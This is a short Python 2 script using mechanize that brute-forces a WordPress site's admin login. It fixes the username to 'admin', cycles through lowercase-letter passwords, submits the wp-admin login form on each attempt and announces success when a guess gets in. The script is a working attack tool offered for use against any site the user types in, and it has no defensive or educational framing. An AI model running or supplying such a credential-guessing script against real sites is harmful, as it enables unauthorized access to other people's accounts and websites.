# -*- coding: utf-8 -*-
"""
Created on Sun Dec  2 20:59:33 2012

@author: tunnelshade
"""

import mechanize
import math

browser = mechanize.Browser()
browser.set_handle_robots(False)



test_cases = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

print(' \n There are no exception handlers in this version, So use with caution')
print(' Example : - Enter the site url without the last slash :- www.wordpresssite.com \n')
site = raw_input('Enter the site url without the last slash :- ')
#char_count = input('Enter the number of characters from which brute-forcing must start :- ')

norm_count = 1


success_flag = False


while success_flag == False:
        
    temp = norm_count - 1
    string = ''
    response = browser.open("http://"+site+"/wp-admin/")
    
    browser.select_form('loginform')
    browser['log'] = 'admin'   
    
    while True:
        temp2 = temp%len(test_cases)        
        string = test_cases[temp2] + string
        temp = temp/len(test_cases)
        
        if temp == 1:
            string = 'a' + string
            break
        
        if temp == 0:
            break
    
    print("The string in test is " + string)

    browser['pwd'] = string
    
    browser.submit()    
    
    if browser.geturl() == ("http://"+site+'/wp-admin/'):
        success_flag = True
        print("YEAh WE GOT IT :- "+string)
    norm_count += 1
